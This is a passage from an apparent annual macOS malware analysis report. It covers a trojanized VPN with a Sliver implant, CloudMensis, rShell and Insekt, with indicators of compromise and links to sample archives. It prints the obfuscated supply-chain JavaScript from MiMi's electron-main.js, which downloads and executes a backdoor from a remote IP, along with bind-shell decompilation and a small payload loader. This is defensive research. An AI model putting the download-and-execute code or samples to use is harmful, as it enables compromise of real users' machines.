:\n\"/Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist\",\n\n  \"process\" : {\n\n   \"arguments\" : [\n\n    \"/bin/bash\",\n\n    \"/Volumes/vpn.app/Contents/Resources/script\"\n\n   ],\n\n   \"path\" : \"/bin/bash\",\n\n   \"name\" : \"bash\",\n\n   \"pid\" : 9499\n\n  }\n\n }\n\n}\n\n\n```\nAs the RunAtLoad key is set to true the specified binary (~/.androids/softwareupdated)\nwill be persistently executed by macOS, each time the user logs in.\n\n**Capabilities: Implant and (in-memory) Module Loader**\n\n\n-----\n\nThe script executed by the malicious VPN application downloads and installs two additional\nbinaries:\n```\n   ~/covid\n   ~/.androids/softwareupdated\n\n```\nAs just noted, the latter is persisted as a launch agent (com.apple.softwareupdate.plist).\n\nThe SentinelOne researchers noted that this persistent binary, softwareupdated is a Sliver\nimplant:\n\n\"Sliver implants offer the operator multiple functions useful to adversaries, including\n_opening a shell on the target machine. The softwareupdated binary periodically checks_\n_in with the C2 to retrieve scheduled tasks, execute them, and return the results. Sliver_\n_implants also have the ability to allow the operator to open an interactive real time_\n_session for direct tasking and exploitation.\" -SentinelOne_\n\nThis is easy to confirm via embedded strings:\n```\n% strings -a softwareupdated\n\n...\n\nsliverpb/sliver.proto\n\n.sliverpb.EnvelopeR\n\n.sliverpb.RegisterR\n\n.sliverpb.RegisterR\n\n.sliverpb.NetInterfaceR\n\n.sliverpb.FileInfoR\n\n.sliverpb.SockTabEntry.SockAddrR\n\n.sliverpb.SockTabEntry.SockAddrR\n\n.sliverpb.SockTabEntryR\n\n.sliverpb.DNSBlockHeaderR\n\n.sliverpb.ServiceInfoReqR\n\n.sliverpb.ServiceInfoReqR\n\n.sliverpb.PivotTypeR\n\n.sliverpb.PivotTypeR\n\n.sliverpb.NetConnPivotR\n\n.sliverpb.PivotPeerR\n\n.sliverpb.PeerFailureTypeR\n\n.sliverpb.PivotListenerR\n\n.sliverpb.WGTCPForwarderR\n\n.sliverpb.WGSocksServerR\n\n.sliverpb.WGSocksServerR\n\n.sliverpb.WGTCPForwarderR\n\n.sliverpb.WindowsPrivilegeEntryR\n\nB/Z-github.com/bishopfox/sliver/protobuf/sliverpbb\n\n\n```\nWhat is Sliver?\n\n\n-----\n\n[According to its Github repository, Sliver is, an open source cross-platform adversary](https://github.com/BishopFox/sliver)\nemulation/red team framework ‚Ä¶support[ing] C2 over Mutual TLS (mTLS), WireGuard,\nHTTP(S), and DNS‚Äù\n\nAs a fully-featured (persistent) implant, Sliver affords a remote attacker, complete control\nover an infected system. Thus any user infected with this malware, is pretty much owned.\n\nThe second binary downloaded and installed by the malicious VPN application is named\n```\ncovid. The SentinelOne researchers analyzed this binary as well, revealing it is a simple\n\n```\nloader module, capable of downloading and executing other payloads directly from memory:\n\n\"The covid executable reaches out to http[:]//46[.]137.201.254, this time on port\n_8001...it uses a 'fileless' technique to execute a further payload in-memory, evidenced_\n_by the tell-tale signs of NSCreateObjectFileImageFromMemory and NSLinkModule.\" -_\nSentinelOne\n\nThe ability to download and execute other payloads gives the malware unlimited extensibility.\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for this malware include the following (credit: SentinelOne):\n\nExecutable Components:\n```\n      ~/covid:\n\n```\n7831806172857a563d7b4789acddc98fc11763aaf3cedf937630b4a9dce31419\n```\n      ~/.androids/softwareupdated:\n\n```\nd9bba1cfca6b1d20355ce08eda37d6d0bca8cb8141073b699000d05025510dcc\n\nFiles/Directories:\n```\n      ~/.androids/\n      ~/Library/LaunchAgents/com.apple.softwareupdate.plist\n\n```\nNetwork:\n```\n      46.137.201.254\n\n## üëæ CloudMensis\n\n```\nLeveraging cloud providers for its command & control, CloudMensis exfiltrates items such as\ndocuments, keystrokes, and screen shots.\n\n\n-----\n\n[Download: CloudMensis (password: infect3d)](https://github.com/objective-see/Malware/raw/main/CloudMensis.zip)\n\n[In July, a researcher (Marc-Etienne M.L√©veill√©) from ESET published an detailed report on a,](https://twitter.com/marc_etienne_)\n‚Äúa previously unknown macOS backdoor that spies on users of the compromised Mac and\nexclusively uses public cloud storage services to communicate back and forth with its\noperators.‚Äù\n\nMalware alert. üëÄ\n\n[Previously unknown macOS #malware uses cloud storage as a C&C channel to](https://twitter.com/hashtag/malware?src=hash&ref_src=twsrc%5Etfw)\nexfiltrate documents, keystrokes, and screen captures from compromised Macs. Read\nmore about the [#CloudMensis spyware detected by #ESETresearch.#ESET](https://twitter.com/hashtag/CloudMensis?src=hash&ref_src=twsrc%5Etfw)\n[#ProgressProtected](https://twitter.com/hashtag/ProgressProtected?src=hash&ref_src=twsrc%5Etfw) [#CloudTechnology](https://twitter.com/hashtag/CloudTechnology?src=hash&ref_src=twsrc%5Etfw)\n\n‚Äî ESET (@ESET) [July 19, 2022](https://twitter.com/ESET/status/1549380430142504961?ref_src=twsrc%5Etfw)\n\n**Writeups:**\n\n[‚ÄúI see what you did there: A look at the CloudMensis macOS spyware‚Äù](https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/)\n\n**Infection Vector: Unknown**\n\nThe ESET report states that infection vector for CouldMensis remains unknown:\n\n\"We still do not know how victims are initially compromised by this threat. \" -ESET\n\nst[-loader) that would clean up from a Safari sandbox escape. Though this code is no longer invoked and the]\nSafari bug has been long patched, it shows that, at least at one point, ESET‚Äôs did find code (in the 1deployed via this same infection vector, albeit with newer exploit(s). `CloudMensis was likely deployed via a browser exploit. Thus perhaps CloudMensis is still(?)`\n\nWhat is known (and is noted in the ESET report), is that once code execution is gained on a\nvictim machine, that there is a ‚Äútwo-stage [installation] process‚Äù:\n\n\n-----\n\nCloudMensis' Installation (credit: ESET)\nOf note is that the first stage downloader, retrieves the 2nd stage payload (the persistent\nimplant) from a cloud-storage provider. In the method named start one can find the code\nthat downloads and saves the 2nd-stage payload to disk. The payload, (named MyExecute) is\ndownloaded from a cloud storage provider named pCloud. It is saved to disk as\n```\n/Library/WebServer/share/httpd/manual/WindowServer:\n1/* @class AppDelegate */\n\n2-(void)start {\n\n3  ...\n\n4\n\n5  rax = [pCloud alloc];\n\n6  rax = [rax init];\n\n7  \n\n8  rax = [rax DownloadFile:@\"/MyExecute\"];\n\n9  [rax writeToFile:@\"/Library/WebServer/share/httpd/manual/WindowServer\"\natomically:0x1];  \n\n```\n**Persistence: Launch Daemon**\n\n```\nCloudMensis is installed as a launch daemon. Examining the disassembly of the 1 -stagest\n\n```\ninstaller, reveals hardcoded strings for both the launch daemon‚Äôs property list\n(.com.apple.WindowServer.plist) as well as the launch daemon binary\n\n\n-----\n\n(/Library/WebServer/share/httpd/manual/WindowServer):\n\nHardcoded Launch Daemon Strings\nThe key-value pairs for the .com.apple.WindowServer.plist launch daemon property list\nare created (via a NSMutableDictionary)in the method named start:\n```\n 1/* @class AppDelegate */\n\n 2-(void)start {\n\n 3  ...\n\n 4  rax = [NSMutableDictionary dictionaryWithCapacity:0x5];\n\n 5  r13 = rax;\n\n 6\n 7  [r13 setObject:@\"com.apple.Windowserver\" forKey:@\"Label\"];\n\n 8  ...\n\n 9\n10  rax = @(YES);\n\n11  [r13 setObject:rax forKey:@\"RunAtLoad\"];\n\n12  \n\n13  [r13 setObject:path forKey:@\"ProgramArguments\"];\n\n14  [r13 writeToFile:@\"/Library/LaunchDaemons/.com.apple.WindowServer.plist\"\n\n15                                atomically:0x1];\n\n```\nAs the RunAtLoad key is set to YES (true) the specified binary (the CloudMensis implant,\n```\n/Library/WebServer/share/httpd/manual/WindowServer) will be persistently executed by\n\n```\nmacOS each time the system is (re)booted.\n\n**Capabilities: Backdoor**\n\nThe CloudMensis malware, is fully featured backdoor, designed to both spy on and collect a\nmyriad of information about its victims:\n\n\"The second stage [persistent component] of CloudMensis is ...packed with a number\n_of features to collect information from the compromised Mac. The intention of the_\n_attackers here is clearly to exfiltrate documents, screenshots, email attachments, and_\n_other sensitive data.\" -ESET_\n\nIn order to perform its large range of capabilities, CloudMensis exposes almost 40\ncommands, command that can be remotely tasked an attacker. The ESET report lists a\nsubset of these commands which include:\n\nScreen capture\nProcess listing\nList emails / attachments\n\n\n-----\n\nDownload and execute files\nList files on removable storage\nExecute commands (and upload output)\n\nAs the malware authors did not obfuscate method names, get a list of commands (for\nexample via the strings command, or class-dump). Moreover, this will point the analyst to\ncode that implements each command.\n```\n% ./class-dump CloudMensis/WindowServer\n\n...\n\n@interface functions : NSObject\n\n- (BOOL)EncryptMyFile:(id)arg1 encrypt:(BOOL)arg2 key:(unsigned char)arg3\n\n                           afterDelete:(BOOL)arg4;\n\n- (void)EMAILSearchAndMoveFS;\n\n- (void)SearchAndMoveFS:(id)arg1 removable:(BOOL)arg2;\n\n- (void)ZipAndMoveZS:(id)arg1 prefix:(BOOL)arg2 sizelimit:(BOOL)arg3\n\n                     subdir:(BOOL)arg4 afterDelete:(BOOL)arg5;\n\n- (void)GetIpAndCountryCode:(id)arg1;\n\n- (BOOL)CreatePlistFileAt:(id)arg1 withLabel:(id)arg2 exePath:(id)arg3\n\n                     exeType:(int)arg4 keepAlive:(BOOL)arg5;\n\n- (void)UploadFileImmediately:(id)arg1 CMD:(int)arg2 delete:(BOOL)arg3;\n\n- (void)ExecuteShellCmdAndUpload:(id)arg1;\n\n- (void)ExecuteCmdAndSaveResult:(id)arg1 saveResult:(BOOL)arg2\n\n                          uploadImmediately:(BOOL)arg3;\n\n- (void)GetFilePropertySHA1:(id)arg1 sha1Result:(char *)arg2;\n\n- (void)MoveToFileStore:(id)arg1 Copy:(BOOL)arg2;\n\n@end\n\n...\n\n@interface screen_keylog : NSObject\n\n- (void)loop_usb;\n\n- (void)keyLogger;\n\n- (id)getScreenShotData;\n\n- (void)searchRemovable;\n\n- (void)keylog;\n\n- (void)runKeyScreenFunc;\n\n@end\n\n\n```\nOne can easily follow the methods names in the malware‚Äôs disassembly to gain an\nunderstanding how each command is implemented. For example, let‚Äôs look at the\n```\nEMAILSearchAndMoveFS method, so see how CloudMensis will search for emails on an\n\n```\ninfected machine:\n\n\n-----\n\n```\n 1/ @class functions /\n\n 2-(void)EMAILSearchAndMoveFS {\n\n 3  var_128 = self;\n\n 4  ...\n\n 5  rax = [NSString stringWithFormat:@\"/Users/%@/Library/Mail\", rax];\n\n 6  r13 = [NSURL fileURLWithPath:rax];\n\n 7  ...\n\n 8  r14 = [rax enumeratorAtURL:r13 includingPropertiesForKeys:r14 options:0x0 ...];\n\n 9  \n\n10  rax = [rax countByEnumeratingWithState:&var_210 objects:&var_B0 count:0x10];\n\n11  ...\n\n12  \n\n13  rsi = @selector(MoveToFileStore:Copy:);\n\n14 \n\n```\nIn short (as can be seen in the decompilation of the EMAILSearchAndMoveFS method), the\nmalware will enumerate all users‚Äô Library/Mail directory. All emails (and attachments?) will\nthen be moved into the malware‚Äôs ‚ÄúFile Store‚Äù, and subsequently exfiltrated.\n\nAnother (more simple command) is the GetIpAndCountryCode: method that can be tasked\nby remote attackers in order to geolocation infected systems. Looking at its implementation\nshows it simply makes a (JSON) request to ipinfo.io (and the parse the response):\n```\n 1/* @class functions */\n\n 2-(void)GetIpAndCountryCode:(void *)arg2 {\n\n 3  r15 = [arg2 retain];\n\n 4  rax = [NSURL URLWithString:@\"https://ipinfo.io/json\"];\n\n 5  rbx = [[NSData dataWithContentsOfURL:rax] retain];\n\n 6  if (rbx != 0x0) {\n\n 7      if (r15 != 0x0) {\n\n 8          [rbx writeToFile:r15 atomically:0x1];\n\n 9      }\n\n10      var_58 = r15;\n\n11      var_50 = rbx;\n\n12      rax = [NSJSONSerialization JSONObjectWithData:rbx options:0x0\nerror:0x0];\n\n13\n14      ...\n\n15 \n\n```\nBrowsing to ipinfo.io/json will return a dictionary with geolocation information based on the ip\naddress of your connection. Assuming the victim isn‚Äôt using a VPN, this can provide some\nbasis geolocation.\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for CloudMensis include the following (credit: ESET):\n\n\n-----\n\nExecutable Components:\n```\n      /Library/WebServer/share/httpd/manual/WindowServer:\n      317ce26cae14dc9a5e4d4667f00fee771b4543e91c944580bbb136e7fe339427\n      b8a61adccefb13b7058e47edcd10a127c483403cf38f7ece126954e95e86f2bd\n\n```\nFiles/Directories:\n```\n      /Library/WebServer/\n      /Library/LaunchDaemons/.com.apple.WindowServer.plist\n\n```\nNetwork:\n\nVarious public cloud providers\n\nESET‚Äôs [report on CloudMensis also contains other IoCs, and thus should also be consulted.](https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/)\n\n## üëæ rShell\n\nDelivered via a supply-chain attack, this backdoor affords basic, albeit sufficient capabilities\nto remote attacker.\n\n[Download: rShell (password: infect3d)](https://github.com/objective-see/Malware/raw/main/rShell.zip)\n\nIn August, researchers from TrendMicro uncovered an APT server hosting a new macOS\nmalware samples named rShell:\n\n\"We noticed a server hosting ... a malicious Mach-O executable named 'rshell.' [Other\n_malware on the server is] used by Iron Tiger (also known as Emissary Panda, APT27,_\n_Bronze Union, and Luckymouse), an advanced persistent threat (APT) group that has_\n_been performing cyberespionage for almost a decade, and there have been no reports_\n_of this group associated with a tool for Mac operating systems (OS). We analyzed the_\n_Mach-O sample and found it to be a new malware family targeting the Mac OS_\n_platform.\" -TrendMicro_\n\n‚Ä¶and perhaps most interesting, turns out the malware was spread via an insidious supplychain attack!\n\n\n-----\n\n**Writeups:**\n\n[‚ÄúLuckyMouse uses a backdoored Electron app to target MacOS‚Äù](https://blog.sekoia.io/luckymouse-uses-a-backdoored-electron-app-to-target-macos/)\n\n‚ÄúIron Tiger Compromises Chat Application Mimi, Targets Windows, Mac, and Linux\nUsers‚Äù\n\n**Infection Vector: Supply-chain attack**\n\nArguably the most interesting aspect of rShell (which itself is a fairly basic backdoor), is its\ninfection vector: a (true) supply-chain attack.\n\nIn order to infect macOS users, the APT attacker compromised the servers of a the MiMi\ninstant messaging application ‚Ä¶infecting the legitimate application. Thus users who\ndownloaded MiMi (from the legitimate MiMi website) would become infected when running\nthe application!\n\nThe MiMi Website (credit: sekoia.io\n\n\"MiMi (mimi = ÁßòÂØÜ = secret in Chinese) is an instant messaging application designed\nespecially for Chinese users ... investigation showed that MiMi chat installers have\nbeen compromised to download ...rshell samples for the Mac OS platform. Iron Tiger\ncompromised the [MiMi] server hosting the legitimate installers for this chat application\nfor a supply chain attack.\" -TrendMicro\n\n\n-----\n\nAs noted by both the TrendMirco and Sekoia researchers (who both analyzed the attack), the\n```\nMiMi application was subverted by the addition of obfuscated (packed) JavaScript inside the\n\n```\napplication‚Äôs electron-main.js file:\n```\n1module.exports=function(t){eval(function(p,a,c,k,e,r){e=function(c)\n{return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?\nString.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c-)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function()\n{return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new\nRegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(9(){0 5=1(\"5\");0 h=1(\"h\");0 6=1(\"6\");0\n7=1(\"7\");0 2=1(\"2\");0 3=1(\"m\").3;n.i(\"o\",(e)=>{j.k(e)});9 l(a,b,c){8\nd=7.p(b);6(a).q(d).i(\"r\",c)}s(2.t()==\"u\"){8 f=2.v()+\"/\";8\ng=\"5://w.y.z.A/\";l(g+\"4\",f+\"4\",()=>{j.k(\"B C\");3(\"D +x \"+f+\"4\");3(f+\"4\")})}})\n();',40,40,'const|require|os|exec|rshell|http|request|fs|var|function||||||||https|on\n|console|log|downloadFile|child_process|process|uncaughtException|createWriteStream|p\nipe|close|if|platform|darwin|tmpdir|139||180|216|65|download|finish|chmod'.split('|')\n,0,{}));var e={};function n(r){if(e[r])return e[r].exports;var o=e[r]=\n{i:r,l:!1,exports:{}};return\nt[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}return\nn.m=t,n.c=e,n.d=function(t,e,r){n.o(t,e)||Object.defineProperty(t,e,\n{enumerable:!0,get:r})},n.r=function(t){\"undefined\"!==typeof...\n\n```\nThis JavaScript will be automatically executed when the (unsuspecting) user opens the MiMi\napplication.\n\nBelow, is a relevant snippet of the unpacked JavaScript (unpacked by the TrendMicro\nresearchers:\n```\n1...\n\n2if (os.platform() as \"darwin\") {\n\n3 var f = os.tmpdir() + \"/\";\n\n4 var g = \"http://139.180.216.65/\";\n\n5 downloadFile(g + \"rshell\", f + \"rshell\", () => { console. log(\"download finish\");\n\n6 exec(\"chmod +x \" + f + \"rshell\");\n\n7 exec(f + \"rshell\")\n\n8}\n\n```\nThe unpacked JavaScript is easy to understand, and performs the following actions:\n\ndownloads a binary named rshell from 139.180.216.65\nsets it executable (via chmod)\nexecutes it\n\n**Persistence: None**\n\nThe rshell backdoor is not persistence. This is noted by the Sekoia researchers who state:\n\n\" ...[rshell] does not display a persistence mechanism.\" -ESET\n\n\n-----\n\nWe can confirm this via static code analysis as well as by executing it on an analysis\nmachine. The former did not reveal any code related to persistence, while when executed,\nthe backdoor did not persist.\n\nAs rshell is a simple backdoor, it may simply be a 1 -stage tool, that on machines ofst\ninterest could download and install a persistent (2nd-stage) tool. This approach is common in\nsupply chain attacks, whereas the majority of victims may not be of interest to the attackers.\n\n\nAlso worth noting, as the backdoor will be (re)executed each time the user launches the\ninfected MiMi application some level of (‚Äúuser-assisted‚Äù) persistence is achieved.\n\n**Capabilities: Backdoor**\n\n\"The rshell executable is a standard backdoor and implements functions typical of\n_similar backdoors\" -TrendMicro_\n\nThe backdoor‚Äôs capabilities include:\n\nBasic survey\nRemote tasking\n\nThe survey logic is implemented in an unnamed subroutine (at 0x000000010001754e).\nStrings in this function include: ‚Äúlogin‚Äù, ‚Äúhostname‚Äù, ‚Äúlan‚Äù, ‚Äúusername‚Äù, ‚Äúguid‚Äù, and ‚Äúversion‚Äù.\nThe function invokes helper functions to generate the survey data. For example, one such\nhelper calls uname to get the host‚Äôs name:\n```\n1int sub_1000041a5(int arg0, int arg1) {\n\n2  \n\n3  rax = uname(&var_510);\n\n4  ....\n\n5}\n\n```\n‚Ä¶while another invokes getuid and getpwuid to get the victim‚Äôs user name:\n```\n1int sub_100004172(int arg0, int arg1) {\n\n2  rbx = arg0;\n\n3  rax = getuid();\n\n4  rax = getpwuid(rax);\n\n5  ...\n\n6}\n\n```\n\n-----\n\nThis survey information is then transmitted to the attacker s command and control server\n(103.79.77.178):\n\n(Attempted) Connection to the C C Server\nThe backdoor‚Äôs main purpose is to execute commands, tasked to it by the command and\ncontrol server. The commands are one of two types:\n\n\"[the] backdoor accepts two 'types' of commands: 'cmd' and 'file'. \" -Sekoia\n\n[Both the TrendMicro report and Sekoia report identify three ‚Äúcmd‚Äù-type commands which](https://www.trendmicro.com/en_us/research/22/h/irontiger-compromises-chat-app-Mimi-targets-windows-mac-linux-users.html)\ninclude:\n\nStart a new shell\nExecute commands (via the shell)\nTerminate the new shell.\n\nHere‚Äôs backdoor‚Äôs code, responsible for starting a new shell (initiated via a call to forkpty):\n\n\n-----\n\n```\n 1void sub_100023204(int arg0, int arg1, int arg2, int arg3) {\n\n 2  rbx = arg0;\n\n 3  r14 = arg0 + 0x4;\n\n 4  rax = forkpty(r14, 0x0, 0x0, 0x0);\n\n 5  *(int32_t *)rbx = rax;\n\n 6  if (rax != 0xffffffff) {\n\n 7      if (rax != 0x0) {\n\n 8          r15 = *(int32_t *)(rbx + 0x4);\n\n 9          fcntl(r15, 0x3) | 0x4;\n\n10          fcntl(r15, 0x4);\n\n11          var_20 = 0xa00050;\n\n12          ioctl(*(int32_t *)(rbx + 0x4), 0xffffffff80087467);\n\n13          sub_1000232e0(rbx + 0x10, r14);\n\n14      }\n\n15      else {\n\n16          setsid();\n\n17          setenv(\"HISTFILE\", \"\", 0x1);\n\n18          setenv(\"TERM\", \"vt100\", 0x1);\n\n19          execl(\"/bin/bash\", \"bash\");\n\n20          exit(0x0);\n\n21      }\n\n22  }\n\n23  return;\n\n24}\n\n```\nThe other type of commands, are ‚Äúfile‚Äù commands, which allow a remote attacker to interact\nwith the filesystem of the infected machine. These include expected commands such as:\n\nDirectory/file enumeration\nDownload file\nUpload file\nDelete file\n\nThough not overly complex, rShell‚Äôs capabilities will afford a remote attacker complete\ncontrol over an infected system, as well as allowing a more complex/persistent 2nd-stage\nimplant to be installed, if needed.\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for rShell include the following (credit: TrendMicro):\n\nExecutable Components:\n```\n      Rshell:\n      3a9e72b3810b320fa6826a1273732fee7a8e2b2e5c0fd95b8c36bbab970e830a\n      8c3be245cbbe9206a5d146017c14b8f965ab7045268033d70811d5bcc4b796ec\n\n```\n\n-----\n\nNetwork:\n```\n      139.180.216.65\n      45.142.214.193\n      104.168.211.246\n      80.92.206.158\n      45.77.250.141\n‚Ä¶\n\n```\n[TrendMicro, has published a file solely containing such IoCs, which should also be](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/h/iron-tiger-compromises-chat-application-mimi,-targets-windows,-mac,-and-linux-users/IOCs-IronTiger-compromises-chat-application-mimi-targets-windows-mac-linux-users.txt)\nconsulted.\n\n## üëæ Insekt\n\nThe Alchimist attack framework deploys cross-platform ‚ÄúInsekt‚Äù payloads including macOS\nvariants.\n\n[Download: Insekt (password: infect3d)](https://github.com/objective-see/Malware/raw/main/Insekt.zip)\n\nIn October, a researchers from Talos discovered a new attack framework named ‚ÄúAlchimist‚Äù\ncapable of deploying cross-platform malware named ‚ÄúInsekt‚Äù\n\n[We recently discovered a new C2 framework called #Alchimist that's spreading the](https://twitter.com/hashtag/Alchimist?src=hash&ref_src=twsrc%5Etfw)\n[new #Insekt trojan, targeting Windows, Mac and Linux machines Windows, Linux and](https://twitter.com/hashtag/Insekt?src=hash&ref_src=twsrc%5Etfw)\n[Mac machines https://t.co/s8Njh7idFr](https://t.co/s8Njh7idFr) [pic.twitter.com/CRRYEjhlBN](https://t.co/CRRYEjhlBN)\n\n[‚Äî Cisco Talos Intelligence Group (@TalosSecurity) October 13, 2022](https://twitter.com/TalosSecurity/status/1580550920898650112?ref_src=twsrc%5Etfw)\n\n**Writeups:**\n\n[‚ÄúMalware Attack Framework ‚ÄòAlchimist‚Äô Designed to Exploit Macs‚Äù](https://www.intego.com/mac-security-blog/malware-attack-framework-alchimist-designed-to-exploit-macs/)\n\n\n-----\n\n[Alchimist: A new attack framework in Chinese for Mac, Linux and Windows](https://blog.talosintelligence.com/alchimist-offensive-framework/)\n\n**Infection Vector: Unknown**\n\nWhat Talos discovered what an attack framework (and it‚Äôs payloads). However, exactly how\nthe attackers would intially gain access to victims Linux/Windows/Mac systems (in order to\ndeploy the Alchimist payloads) is not known.\n\nHowever based on capabilites of the attack framework, specifically the ability to ‚Äúgenerate\nPowerShell and wget code snippets‚Äù could indicate that attackers could use standard (userassisted) infection mechanisms such as malicous documents:\n\n\"\"An attacker can embed these commands in a script (instrumented via a malicious\n_entry point such as a maldoc, LNK, etc.) and deliver it to the victims by various means_\n_to gain an initial foothold, thereby downloading and implanting the Insekt RAT.\" -Talos_\n\n**Persistence: Unknown**\n\nUnfortunately a version of the Insekt RAT for macOS was not recovered. As such, it is not\nknown how (or if) persistence is achieved.\n\n**Capabilities: Backdoor/RAT**\n\nAs noted, a macOS version the Insekt RAT was not recovered nor seen in the wild.\nHowever, in their report, Talos noted that the Windows / Linux variant supported the following\nfeatures ‚Ä¶features that likely are implemented as well in the macOS variant:\n\nSleep\n\nTake screenshots\n\nUpgrade backdoor\n\nRetrieve file sizes\n\nDetermine OS information\n\nExecute (shell?) commands\n\nExecute (shell?) commands as another user\n\nThe report also notes that (the Window/Linux variants):\n\n\n-----\n\n_the implant consists of other capabilities [as well] such as shellcode execution, port_\n_and IP scanning, SSH key manipulation, proxying connections, etc.\" -Talos_\n\nAlso mentioned in the Talos report is a macOS tool (found in the open directory of the\nAlchimist server). This tool contains a (limited) privilege escalation vulnerability as well as:\n\n\"The Mach-O file discovered in the open directory is a 64-bit executable written in\n_GoLang embedded with an exploit and a bind shell backdoor. The dropper contains an_\n_exploit for a privilege escalation vulnerability (CVE-2021-4034) in polkit's pkexec utility._\n_However, this utility is not installed on MacOSX by default, meaning the elevation of_\n_privileges is not guaranteed. Along with the exploit, the dropper would bind a shell to a_\n_port providing the operators with a remote shell on the victim machine.\" -Talos_\n\nThe implementation of the privilege escalation vulnerability (CVE-2021-4034) comes from\n[github: poc-cve-2021-4034 and exploits a bug in Polkit.](https://github.com/dzonerzy/poc-cve-2021-4034)\n\nAs noted by Talos, Polkit is not installed by macOS by default (it‚Äôs a 3rd-party open-source\nproject). As it‚Äôs rather unlikely that PolKit is installed macOS victim‚Äôs machines, the impact of\nthis tool is likely minimal. Still, let‚Äôs explore it a bit.\n\nWhen run, the tool drops a binary named payload.so. Using the file tool one can see it is a\ndynamic library (‚Äòdylib‚Äô):\n```\n% file payload.so\n\npayload.so: Mach-O 64-bit dynamically linked shared library x86_64\n\n\n```\nThe main logic for the bind-shell appears in the function named main.gconv_init (found at\n```\n0x00000000000fd300). The (annotated) decompilation of this function reveals GO-code, that:\n\n```\nreads an integer value from an environment variable NOTTY_PORT\ninvokes the net.Listen function to listen on this port (interface: 0.0.0.0)\nhandles the connection (via a call to a function named main.handle_connection)\n```\n 1//get port via 'NOTTY_PORT'\n\n 2os.Getenv(..., NOTTY_PORT, 0xa, ...);\n 3strconv.ParseInt(...);\n\n 4\n 5//create: \"0.0.0.0:<port>\"\n\n 6fmt.Sprintf(..., 0.0.0.0, ..., port, ...);\n\n 7\n 8//listen\n\n 9net.Listen(\"tcp\", address);\n\n10\n11//handle connection\n\n12main.handle_connection(...);\n\n```\n\n-----\n\nWhen a remote attacker connects, a function named main.handle_connection is invoked\n(as shown in the above decompilation).\n\nThis executes the attackers command either via:\n```\n   os/exec.Command\n\n```\nor\n```\n   _os/exec.(*Cmd).Start and _os/exec.(*Cmd).Wait\n\n```\nThe tool also contains logic to directly execute a command if the CMD environment variable is\nset. This will be executed via syscall.Exec by means of /bin/sh (-c):\n```\n0x00000000000fecec            db 0x2d ; '-'\n\n0x00000000000feced            db 0x63 ; 'c'\n\n0x00000000000ff3ab            db 0x2f ; '/'\n\n0x00000000000ff3ac            db 0x62 ; 'b'\n\n0x00000000000ff3ad            db 0x69 ; 'i'\n\n0x00000000000ff3ae            db 0x6e ; 'n'\n\n0x00000000000ff3af            db 0x2f ; '/'\n\n0x00000000000ff3b0            db 0x73 ; 's'\n\n0x00000000000ff3b1            db 0x68 ; 'h'\n\n\n```\nAs the file, payload.so is a dynamic library (dylib) it cannot be directly executed ‚Ä¶instead it\nneeds a loader. For analysis purposes let‚Äôs write a simple loader that dlopens payload.so\nand invokes one of its exported function.\n\nFirst, let‚Äôs dump the exports via nm (using the -gu command line flags):\n```\n% nm -gU ~/Downloads/payload.so\n\n00000000000fdf30 T _gconv\n\n00000000000fdf70 T _gconv_init\n\n...\n\n\n\n```\nWe‚Äôll call the gconv_init export as its contains the bind-shell logic:\n```\n1 void *handle = dlopen(\"./payload.so\", RTLD_LAZY);\n\n2\n\n3 int (*fptr)(void) = (int (*)(void))dlsym(handle, \"gconv_init\");\n\n4 (*fptr)();\n\n```\nFile and network events are reported at the process level. Thus in the following output(s), the\nevents are attributed to our (custom) loader ...which has loaded and executed the payload.so\ndynamic library.\nThe file and network events themselves however are triggered by code within the payload.so\n\n\n-----\n\n[While running a File Monitor:, we first observe payload.so self deleting. In the decompilation](https://objective-see.com/products/utilities.html#FileMonitor)\nthis is realized via a call to GO‚Äôs os.removeAll function.\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty\n\n...\n\n{\n\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_UNLINK\",\n\n \"file\" : {\n\n  \"destination\" : \"/Users/user/Downloads/payload.so\",\n\n  \"process\" : {\n\n   \"pid\" : 13363\n\n   \"name\" : \"loader\",\n\n   \"path\" : \"/Users/user/Downloads/loader\",\n\n  }\n\n }\n\n}\n\n\n```\nThen, the bind-shell logic is executed, which results in a listening socket, readily observable\nvia `Netiquette:`\n\nListening Socket\n\n**Indicators of Compromise (IoCs):**\n\nIoCs for Insekt include the following (credit: Talos):\n\n\n-----\n\nExecutable Components:\n```\n      exploit:\n      ef130f1941077ffe383fe90e241620dde771cd0dd496dad29d2048d5fc478faf\n      payload.so:\n      ae9f370c89f0191492ed9c17a224d9c41778b47ca2768f732b4de6ee7d0d1459\n\n```\n[Talos, has published a full list of IoCs which should also be consulted.](https://github.com/Cisco-Talos/IOCs/tree/main/2022/10)\n\n## üëæ KeySteal\n\nKeySteal, as its name implies is a simple keychain stealer, embedded in a trojanized copy of\na popular free application.\n\n[Download: KeySteal (password: infect3d)](https://github.com/objective-see/Malware/raw/main/KeySteal.zip)\n\nIn November, researchers from TrendMicro published a report, details how a copy of the\nopen-source ResignTool was packaged up with keychain-stealing malware\n\nResignTool, a convenient and practical application in Apple devices has been infiltrated\n[by a piece of #malware to steal Keychain information. More details:](https://twitter.com/hashtag/malware?src=hash&ref_src=twsrc%5Etfw)\n[https://t.co/FRhjrO5Al5](https://t.co/FRhjrO5Al5)\n\n[‚Äî Trend Micro Research (@TrendMicroRSRCH) November 19, 2022](https://twitter.com/TrendMicroRSRCH/status/1594012627231215616?ref_src=twsrc%5Etfw)\n\n**Writeups:**\n\n[‚ÄúPilfered Keys: Free App Infected by Malware Steals Keychain Data‚Äù](https://www.trendmicro.com/en_us/research/22/k/pilfered-keys-free-app-infected-by-malware-steals-keychain-data.html)\n\n**Infection Vector: Unknown**\n\n\n-----\n\nThe TrendMicro researchers discovered the malware on VirusTotal:\n\n\"The sample was discovered on VirusTotal by one of our sourcing rules. It was not yet\n_reported to be in the wild but was submitted in 